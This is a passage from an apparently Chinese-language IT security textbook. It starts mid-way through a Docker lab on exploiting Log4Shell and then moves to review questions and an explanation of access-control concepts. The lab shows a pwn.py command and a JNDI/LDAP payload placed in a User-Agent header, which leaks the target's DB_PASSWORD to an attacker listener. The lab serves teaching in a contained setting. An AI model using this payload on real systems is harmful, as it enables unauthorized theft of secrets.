    你会注意到 `target` 服务正在运行 `log4jpwn` 示例应用程序，并且其输出直接显示在屏幕上。`attacker` 服务会立即退出，因为它是为交互式使用而设计的，不会在后台运行任何内容。在另一个终端中，再次导航到实验目录并运行
    `docker-compose run attacker bash`。这将是你用来攻击目标的 shell：


    ```

    PS C:\Users\rxt1077\it230\labs\log4j> docker-compose run attacker bash

    root@3971c61303c8:/#

    ```


    注意一旦进入容器后提示符如何变化。


    在攻击 shell 中，使用 `ip` 命令确定容器的 IPv4 地址。我们需要这个地址，因为一旦利用字符串被记录，`attacker` 容器将监听来自 `target`
    的连接。


    ```

    root@3971c61303c8:/# ip addr show dev eth0

    58: eth0@if59: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc noqueue state
    UP group default

    link/ether 02:42:ac:14:00:02 brd ff:ff:ff:ff:ff:ff link-netnsid 0

    inet <IP_ADDRESS>/16 brd 172.20.255.255 scope global eth0

    valid_lft forever preferred_lft forever

    ```


    你的 IP 不是 `<IP_ADDRESS>`；它是你在其位置找到的任何内容！


    一旦你有了 IP 地址，就可以在 `attacker` 容器上运行 `pwn.py` 脚本，你应该能够读取 `target` 容器上的 `DB_PASSWORD`
    环境变量。


    ```

    root@3971c61303c8:/# python /pwn.py --listen-host <IP_ADDRESS> --exploit-host
    <IP_ADDRESS> --target http://target:8080 --leak ''${env:DB_PASSWORD}''

    i| starting server on <IP_ADDRESS>:8888

    i| server started

    i| setting payload in User-Agent header

    i| sending exploit payload ${jndi:ldap://<IP_ADDRESS>:8888/${env:DB_PASSWORD}}
    to http://target:8080/

    i| new connection from <TARGETS_IP>:44050

    v| extracted value: <DB_PASSWORD>

    i| request url was: http://target:8080/

    i| response status code: 200

    ```


    Docker Compose 会将服务名称解析为 IP 地址，因此目标 URI 不需要查找 IP。`DB_PASSWORD` 的值将出现在这里。


    ## 6.10. 复习问题


    安全解决方案从物理设备迁移到云服务是什么意思？请举一个例子。


    在你看来，误报和漏报哪个更具破坏性？为什么？


    站点到站点 VPN 的应用有哪些？请举一个办公室可能会使用它的场景示例。


    ## 7. 访问控制


    访问控制旨在提供工具，用于针对特定资源进行 `identification`、`authentication`、`authorization` 和 `accounting`。虽然单个控制可能提供多个部分，但理解每个部分代表什么仍然很重要：


    ### Identification


    识别行为者或用于识别行为者的 `something` 的行为。这可以简单到像驾驶执照，也可以复杂到像只有私钥持有者才能生成的加密签名。示例：送货司机出示员工徽章。


    ### Authentication


    当身份通过特定过程得到确认时，会发生此步骤。这可能是使用私钥的过程，或者可能是另一种生物识别过程，例如读取指纹。无论哪种情况，`authentication`
    都是我们验证身份的方法。示例：检查送货司机的徽章。


    ### Authorization


    当行为者被授予访问资源的权限时，即为授权。在日常交谈中，我们可能会认为一旦行为者进展到这一步，`authorization` 就是理所当然的，但实际上，授权依赖于前面的步骤完成，并且实际上可能会失败。系统可能已通过用户名和密码进行身份验证来识别某人是谁，但该用户未设置为有权访问资源。在这种情况下，`authorization`
    步骤将失败。继续我们的送货司机示例：允许送货司机领取包裹。


    ### Accounting


    最后，accounting 是记录对资源访问记录的过程。Accounting 可能是已登录用户的日志以及他们各自访问了哪些资源的日志。同样，对于送货司机：司机的访问记录会写在前台的登记簿中。


    ## 7.1. 一般原则和技术


    ### 7.1.1. 最小权限原则


    最小权限原则指出，行为者只应获得完成其任务所需的资源以及所需的权限。这些资源可以是进程、程序，甚至是用户帐户。这一原则减少了攻击面，并有助于阻止恶意软件的传播，因为单个被攻破的帐户将无法访问所有资源。


    最小权限也是合规性的重要概念。例如，法律可能要求审计所有具有互联网访问权限的帐户。通过将具有互联网访问权限的帐户限制为只有需要互联网访问权限来完成其任务的行为者的帐户，可以更容易地实现合规性。


    ### 7.1.2. 多因素身份验证 (MFA)


    多因素身份验证是一种技术，要求行为者提供两个或多个信息片段用于身份识别。身份识别的一些示例包括用户名和密码、令牌代码、物理令牌或生物识别数据。通常建议使用“持有的东西和知道的东西”，例如发送到你手机的短信中的代码（你持有手机）和密码（你知道密码）。


    有许多流行的 MFA 产品，其中大多数都基于基于时间的代码生成。[Google Authenticator](https://play.google.com/store/apps/details?id=com.google.android.apps.authenticator2&hl=en_US&gl=US)
    和 [Authy](https://authy.com/) 都是手机应用程序，它们从与验证系统同步的加密种子生成代码。RSA ID 在专用硬件设备上生成类似的代码。


    ### 7.1.3. MAC、DAC、RBAC 和 ABAC


    有几种不同的授权模型可供使用。强制访问控制 (MAC) 要求所有对象（文件、目录、设备等）都有一个安全标签，标识谁可以访问它以及如何访问。这是一种特别严格的访问控制形式，需要大量努力来实现和维护，但能实现高级别的安全性。自主访问控制
    (DAC) 通过允许对象所有者确定哪些权限组/用户应被授予该对象来简化事情。这提供了很大的灵活性和易于实现的特点，但如果对象所有者被攻破，可能会导致安全性较低的环境。基于角色的访问控制
    (RBAC) 在 DAC 的基础上构建，使用系统中的一组核心角色来确定谁对对象具有不同级别的访问权限。RBAC 是一种常见且灵活的模型，可以智能地用于实现
    DAC 或 MAC。基于属性的访问控制 (ABAC) 是一种较新的模型，在 RBAC 的基础上构建，并使用更通用的属性，而不仅仅是角色。ABAC 可以根据对象、用户、操作甚至外部上下文的属性来确定谁对对象具有不同级别的访问权限。这些属性可以以任何可以编码为规则的方式一起使用。例如，“从上午
    9:00 到下午 5:00，给 Fred 读取此文件夹中非机密文档的权限。”


